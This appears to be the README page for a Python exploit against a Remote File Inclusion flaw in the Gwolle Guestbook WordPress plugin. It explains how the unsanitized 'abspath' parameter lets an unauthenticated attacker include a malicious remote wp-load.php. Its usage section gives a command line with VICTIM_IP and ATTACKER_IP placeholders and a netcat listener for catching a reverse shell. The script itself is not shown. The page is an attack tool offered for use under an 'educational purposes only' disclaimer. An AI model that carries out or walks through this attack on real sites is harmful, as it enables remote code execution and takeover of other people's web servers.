<h1>Gwolle Guestbook WordPress Plugin RFI Exploit</h1>

<p>This Python script exploits a critical Remote File Inclusion (RFI) vulnerability in the Gwolle Guestbook WordPress Plugin, which can be exploited by a non-authenticated attacker to include a remote PHP file and execute arbitrary code on the vulnerable system.</p>

<h2>Vulnerability Details</h2>

<p>HTTP GET parameter "abspath" is not being properly sanitized before being used in PHP require() function. A remote attacker can include a file named 'wp-load.php' from an arbitrary remote server and execute its content on the vulnerable web server. In order to do so, the attacker needs to place a malicious 'wp-load.php' file into their server document root and include the server's URL into the request.</p>

<p>Successful exploitation of this vulnerability can lead to the compromise of the entire WordPress installation, and may even lead to the entire web server's compromise.</p>

<h2>Usage</h2>

<p>The script requires three arguments:</p>

<ul>
  <li>Target URL: The URL of the vulnerable WordPress installation.</li>
  <li>Attacker host: The IP address or hostname of the attacker's machine.</li>
  <li>Attacker port: The port number where the attacker is listening for a reverse shell.</li>
</ul>

<p>Example:</p>

<pre><code>python3 exploit.py VICTIM_IP/WORDPRESS ATTACKER_IP ATTACKER_PORT</code></pre>

<p>Note: You need to have a netcat listener open on the attacker machine on the specified port.</p>

<h2>Disclaimer</h2>

<p>This script is provided for educational purposes only. The author is not responsible for any damages caused by the misuse of this script.</p>
